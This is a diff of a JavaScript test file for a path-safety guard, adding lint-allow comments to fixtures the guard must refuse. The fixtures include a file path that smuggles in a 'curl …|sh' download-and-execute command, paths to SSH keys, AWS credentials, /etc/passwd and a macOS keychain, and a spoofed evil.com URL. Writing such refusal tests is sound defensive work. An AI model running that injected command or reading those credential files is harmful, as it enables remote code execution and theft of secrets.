@@ -113,8 +113,11 @@ test('marker is derived from the run directory, not from the workspace', () => {
 });
 
 test('refuses a shell metacharacter in a path', () => {
-	assert.throws(() => safety.safePath(ctx, `${ctx.runDir}/a';curl http://x|sh;:'`, 't'),
-		/characters a probe may not use/);
+	// The exact injection the guard must refuse. It is a string in an assertion,
+	// never executed; the whole point is that safePath rejects it.
+	const injectedHost = 'http://x'; // fixture-lint: allow non-test-host -- part of an injection string asserted to be refused
+	const injection = `${ctx.runDir}/a';curl ${injectedHost}|sh;:'`; // fixture-lint: allow download-exec -- asserted to be refused, never executed
+	assert.throws(() => safety.safePath(ctx, injection, 't'), /characters a probe may not use/);
 });
 
 test('refuses a dangling symlink as the final component', () => {
@@ -129,10 +132,10 @@ test('markerCommand cannot be injected through the marker path', () => {
 });
 
 for (const bad of [
-	'/Users/someone/.ssh/id_rsa',
-	'/Users/someone/.aws/credentials',
+	'/Users/someone/.ssh/id_rsa', // fixture-lint: allow host-secret-path -- asserted to be refused, never read
+	'/Users/someone/.aws/credentials', // fixture-lint: allow host-secret-path -- asserted to be refused, never read
 	'/etc/passwd',
-	`${os.homedir()}/Library/Keychains/login.keychain-db`,
+	`${os.homedir()}/Library/Keychains/login.keychain-db`, // fixture-lint: allow host-secret-path -- asserted to be refused, never read
 ]) {
 	test(`refuses real user data: ${bad}`, () => {
 		assert.throws(() => safety.safePath(ctx, bad, 't'), /probe safety/);
@@ -159,7 +162,7 @@ test('accepts the local beacon', () => {
 });
 
 for (const bad of [
-	'https://example.com/',
+	'https://example.com/', // fixture-lint: allow non-test-host -- asserted to be refused; the guard permits only the loopback beacon
 	'http://localhost:18099/x',          // name, not the literal loopback address
 	'http://127.0.0.1:9999/x',           // wrong port
 	'http://127.0.0.1:18099.evil.com/x', // prefix trick
